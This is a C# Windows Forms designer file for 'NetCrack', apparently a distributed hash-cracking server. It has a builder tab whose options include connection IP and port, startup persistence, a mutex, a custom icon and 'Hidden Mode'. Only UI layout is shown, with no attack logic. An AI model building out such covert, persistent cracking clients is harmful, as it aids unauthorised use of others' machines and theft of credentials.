namespace NetCrack
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.ControllGroup = new System.Windows.Forms.GroupBox();
            this.hashOutput = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.targetHash = new System.Windows.Forms.TextBox();
            this.charset = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.CurrentBlock = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.button4 = new System.Windows.Forms.Button();
            this.ConnectedClientsLabel = new System.Windows.Forms.Label();
            this.blockStatusLabel = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.button3 = new System.Windows.Forms.Button();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.button5 = new System.Windows.Forms.Button();
            this.Hidden = new System.Windows.Forms.CheckBox();
            this.portInt = new System.Windows.Forms.NumericUpDown();
            this.label9 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.iconLocation = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.mutexName = new System.Windows.Forms.TextBox();
            this.enableMutex = new System.Windows.Forms.CheckBox();
            this.StartupLocation = new System.Windows.Forms.ComboBox();
            this.EnableStartup = new System.Windows.Forms.CheckBox();
            this.connectionBox = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.ControllGroup.SuspendLayout();
            this.tabPage2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.portInt)).BeginInit();
            this.SuspendLayout();
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new System.Drawing.Point(3, 1);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(326, 260);
            this.tabControl1.TabIndex = 0;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.ControllGroup);
            this.tabPage1.Controls.Add(this.button3);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(318, 234);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Control";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // ControllGroup
            // 
            this.ControllGroup.Controls.Add(this.hashOutput);
            this.ControllGroup.Controls.Add(this.label5);
            this.ControllGroup.Controls.Add(this.targetHash);
            this.ControllGroup.Controls.Add(this.charset);
            this.ControllGroup.Controls.Add(this.label8);
            this.ControllGroup.Controls.Add(this.label7);
            this.ControllGroup.Controls.Add(this.CurrentBlock);
            this.ControllGroup.Controls.Add(this.label6);
            this.ControllGroup.Controls.Add(this.label3);
            this.ControllGroup.Controls.Add(this.button4);
            this.ControllGroup.Controls.Add(this.ConnectedClientsLabel);
            this.ControllGroup.Controls.Add(this.blockStatusLabel);
            this.ControllGroup.Controls.Add(this.label4);
            this.ControllGroup.Enabled = false;
            this.ControllGroup.Location = new System.Drawing.Point(6, 33);
            this.ControllGroup.Name = "ControllGroup";
            this.ControllGroup.Size = new System.Drawing.Size(309, 197);
            this.ControllGroup.TabIndex = 6;
            this.ControllGroup.TabStop = false;
            // 
            // hashOutput
            // 
            this.hashOutput.Location = new System.Drawing.Point(60, 145);
            this.hashOutput.Name = "hashOutput";
            this.hashOutput.ReadOnly = true;
            this.hashOutput.Size = new System.Drawing.Size(243, 20);
            this.hashOutput.TabIndex = 13;
            this.hashOutput.Text = "Idle...";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(8, 148);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(42, 13);
            this.label5.TabIndex = 12;
            this.label5.Text = "Output:";
            // 
            // targetHash
            // 
            this.targetHash.Location = new System.Drawing.Point(60, 119);
            this.targetHash.Name = "targetHash";
            this.targetHash.Size = new System.Drawing.Size(243, 20);
            this.targetHash.TabIndex = 11;
            // 
            // charset
            // 
            this.charset.Location = new System.Drawing.Point(60, 94);
            this.charset.Name = "charset";
            this.charset.Size = new System.Drawing.Size(243, 20);
            this.charset.TabIndex = 10;
            this.charset.Text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(8, 97);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(46, 13);
            this.label8.TabIndex = 9;
            this.label8.Text = "Charset:";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(8, 122);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(35, 13);
            this.label7.TabIndex = 8;
            this.label7.Text = "Hash:";
            // 
            // CurrentBlock
            // 
            this.CurrentBlock.AutoSize = true;
            this.CurrentBlock.Location = new System.Drawing.Point(122, 70);
            this.CurrentBlock.Name = "CurrentBlock";
            this.CurrentBlock.Size = new System.Drawing.Size(25, 13);
            this.CurrentBlock.TabIndex = 7;
            this.CurrentBlock.Text = "???";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(8, 70);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(74, 13);
            this.label6.TabIndex = 6;
            this.label6.Text = "Current Block:";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(8, 16);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(96, 13);
            this.label3.TabIndex = 1;
            this.label3.Text = "Connected Clients:";
            // 
            // button4
            // 
            this.button4.Location = new System.Drawing.Point(6, 171);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(297, 23);
            this.button4.TabIndex = 5;
            this.button4.Text = "Start cracking";
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // ConnectedClientsLabel
            // 
            this.ConnectedClientsLabel.AutoSize = true;
            this.ConnectedClientsLabel.Location = new System.Drawing.Point(122, 16);
            this.ConnectedClientsLabel.Name = "ConnectedClientsLabel";
            this.ConnectedClientsLabel.Size = new System.Drawing.Size(13, 13);
            this.ConnectedClientsLabel.TabIndex = 2;
            this.ConnectedClientsLabel.Text = "0";
            // 
            // blockStatusLabel
            // 
            this.blockStatusLabel.AutoSize = true;
            this.blockStatusLabel.Location = new System.Drawing.Point(122, 41);
            this.blockStatusLabel.Name = "blockStatusLabel";
            this.blockStatusLabel.Size = new System.Drawing.Size(24, 13);
            this.blockStatusLabel.TabIndex = 4;
            this.blockStatusLabel.Text = "0/0";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(8, 41);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(116, 13);
            this.label4.TabIndex = 3;
            this.label4.Text = "Blocks Sent/Receved:";
            // 
            // button3
            // 
            this.button3.Location = new System.Drawing.Point(5, 6);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(310, 25);
            this.button3.TabIndex = 0;
            this.button3.Text = "Start Listening";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.button5);
            this.tabPage2.Controls.Add(this.Hidden);
            this.tabPage2.Controls.Add(this.portInt);
            this.tabPage2.Controls.Add(this.label9);
            this.tabPage2.Controls.Add(this.button2);
            this.tabPage2.Controls.Add(this.iconLocation);
            this.tabPage2.Controls.Add(this.label2);
            this.tabPage2.Controls.Add(this.button1);
            this.tabPage2.Controls.Add(this.mutexName);
            this.tabPage2.Controls.Add(this.enableMutex);
            this.tabPage2.Controls.Add(this.StartupLocation);
            this.tabPage2.Controls.Add(this.EnableStartup);
            this.tabPage2.Controls.Add(this.connectionBox);
            this.tabPage2.Controls.Add(this.label1);
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(318, 234);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Builder";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // button5
            // 
            this.button5.Location = new System.Drawing.Point(283, 132);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(21, 23);
            this.button5.TabIndex = 13;
            this.button5.Text = "...";
            this.button5.UseVisualStyleBackColor = true;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // Hidden
            // 
            this.Hidden.AutoSize = true;
            this.Hidden.Location = new System.Drawing.Point(10, 162);
            this.Hidden.Name = "Hidden";
            this.Hidden.Size = new System.Drawing.Size(90, 17);
            this.Hidden.TabIndex = 12;
            this.Hidden.Text = "Hidden Mode";
            this.Hidden.UseVisualStyleBackColor = true;
            // 
            // portInt
            // 
            this.portInt.Location = new System.Drawing.Point(66, 35);
            this.portInt.Maximum = new decimal(new int[] {
            1410065407,
            2,
            0,
            0});
            this.portInt.Name = "portInt";
            this.portInt.Size = new System.Drawing.Size(238, 20);
            this.portInt.TabIndex = 11;
            this.portInt.Value = new decimal(new int[] {
            1337,
            0,
            0,
            0});
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(7, 37);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(29, 13);
            this.label9.TabIndex = 10;
            this.label9.Text = "Port:";
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(10, 185);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(294, 42);
            this.button2.TabIndex = 9;
            this.button2.Text = "Build";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // iconLocation
            // 
            this.iconLocation.Location = new System.Drawing.Point(66, 135);
            this.iconLocation.Name = "iconLocation";
            this.iconLocation.ReadOnly = true;
            this.iconLocation.Size = new System.Drawing.Size(211, 20);
            this.iconLocation.TabIndex = 8;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(7, 138);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(31, 13);
            this.label2.TabIndex = 7;
            this.label2.Text = "Icon:";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(283, 98);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(21, 20);
            this.button1.TabIndex = 6;
            this.button1.Text = "*";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // mutexName
            // 
            this.mutexName.Location = new System.Drawing.Point(66, 99);
            this.mutexName.Name = "mutexName";
            this.mutexName.ReadOnly = true;
            this.mutexName.Size = new System.Drawing.Size(211, 20);
            this.mutexName.TabIndex = 5;
            this.mutexName.Text = "NC2388291dfc12ec1b02e4629981702bcc3862f50";
            // 
            // enableMutex
            // 
            this.enableMutex.AutoSize = true;
            this.enableMutex.Location = new System.Drawing.Point(10, 101);
            this.enableMutex.Name = "enableMutex";
            this.enableMutex.Size = new System.Drawing.Size(55, 17);
            this.enableMutex.TabIndex = 4;
            this.enableMutex.Text = "Mutex";
            this.enableMutex.UseVisualStyleBackColor = true;
            this.enableMutex.CheckedChanged += new System.EventHandler(this.enableMutex_CheckedChanged);
            // 
            // StartupLocation
            // 
            this.StartupLocation.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.StartupLocation.FormattingEnabled = true;
            this.StartupLocation.Location = new System.Drawing.Point(66, 63);
            this.StartupLocation.Name = "StartupLocation";
            this.StartupLocation.Size = new System.Drawing.Size(238, 21);
            this.StartupLocation.TabIndex = 1;
            // 
            // EnableStartup
            // 
            this.EnableStartup.AutoSize = true;
            this.EnableStartup.Location = new System.Drawing.Point(10, 65);
            this.EnableStartup.Name = "EnableStartup";
            this.EnableStartup.Size = new System.Drawing.Size(60, 17);
            this.EnableStartup.TabIndex = 3;
            this.EnableStartup.Text = "Startup";
            this.EnableStartup.UseVisualStyleBackColor = true;
            this.EnableStartup.CheckedChanged += new System.EventHandler(this.EnableStartup_CheckedChanged);
            // 
            // connectionBox
            // 
            this.connectionBox.Location = new System.Drawing.Point(66, 9);
            this.connectionBox.Name = "connectionBox";
            this.connectionBox.Size = new System.Drawing.Size(238, 20);
            this.connectionBox.TabIndex = 1;
            this.connectionBox.Text = "127.0.0.1";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(7, 12);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(44, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Dns/IP:";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(331, 262);
            this.Controls.Add(this.tabControl1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "NetCrack";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.ControllGroup.ResumeLayout(false);
            this.ControllGroup.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.portInt)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.CheckBox EnableStartup;
        private System.Windows.Forms.TextBox connectionBox;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.ComboBox StartupLocation;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.TextBox mutexName;
        private System.Windows.Forms.CheckBox enableMutex;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.TextBox iconLocation;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label ConnectedClientsLabel;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label blockStatusLabel;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.GroupBox ControllGroup;
        private System.Windows.Forms.Button button4;
        private System.Windows.Forms.Label CurrentBlock;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.TextBox targetHash;
        private System.Windows.Forms.TextBox charset;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.TextBox hashOutput;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.NumericUpDown portInt;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.CheckBox Hidden;
        private System.Windows.Forms.Button button5;
    }
}

